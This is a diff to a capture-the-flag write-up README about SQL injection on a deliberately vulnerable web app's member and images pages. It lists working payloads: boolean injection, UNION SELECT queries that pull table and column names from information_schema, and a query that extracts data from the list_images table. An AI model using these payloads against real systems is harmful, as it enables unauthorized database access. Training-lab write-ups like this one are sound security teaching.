@@ -10,28 +10,25 @@ SQL injection vulnerabilities occur when an attacker is able to insert or "injec
 
 ## Exploitation
 
-### Table Name Disclosure
-
-- **Injection Point**: The `id` parameter on the `member` page.
-- **Payload**: `1 UNION SELECT null, table_name FROM information_schema.tables`
-- **URL Example**: http://<ip_address>/index.php?page=member&id=1+UNION+SELECT+null%2C+table_name+FROM+information_schema.tables&Submit=Submit
-
 ### Boolean-Based SQL Injection
 
 - **Payloads**:
 - `1 OR 1=1`: Forces the application to return true for all conditions.
-- `1 OR EXISTS (SELECT * FROM users)`: Checks if the `users` table contains any rows.
-- **URL Example**: http://<ip_address>/index.php?page=member&id=1+OR+EXISTS+%28SELECT+\*+FROM+users+%29%3B+--+&Submit=Submit#
+
+### Table Name Disclosure
+
+- **Payload**: `1 UNION SELECT null, table_name FROM information_schema.tables`
+- **Usefullness:** Common SQL query used in SQL injection attacks to retrieve table names in database.
 
 ### Column Name Disclosure
 
 - **Payload**: `1 UNION SELECT table_name, column_name FROM information_schema.columns`
-- **URL Example**: http://<ip_address>/index.php?page=member&id=1+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#
+- **Usefullness:** Common SQL query used in SQL injection attacks to retrieve column names in tables.
 
 ### Data Extraction
 
-- **Payload**: `1 OR 1=1 UNION SELECT title, comment from users`
-- **Context**: This payload is used to extract `title` and `comment` from the `users` table.
+- **Payload**: `1 OR 1=1 UNION SELECT title, comment from list_images`
+- **Context**: This payload is used to extract `title` and `comment` from the `list_images` table.
 
 ## Cryptographic Challenge
 
@@ -44,7 +41,6 @@ SQL injection vulnerabilities occur when an attacker is able to insert or "injec
 
 - The "list_images" table contains the following columns: `id`, `url`, `title`, `comment`.
 - The cryptographic challenge provides a unique opportunity to apply decryption and encryption techniques to retrieve a hidden flag.
-  For context, I have the following markdown in a file called `/Users/ionmi/Development/42/darkly/images_sql_injection/Ressources/README.md`:
 
 ## Prevention
 
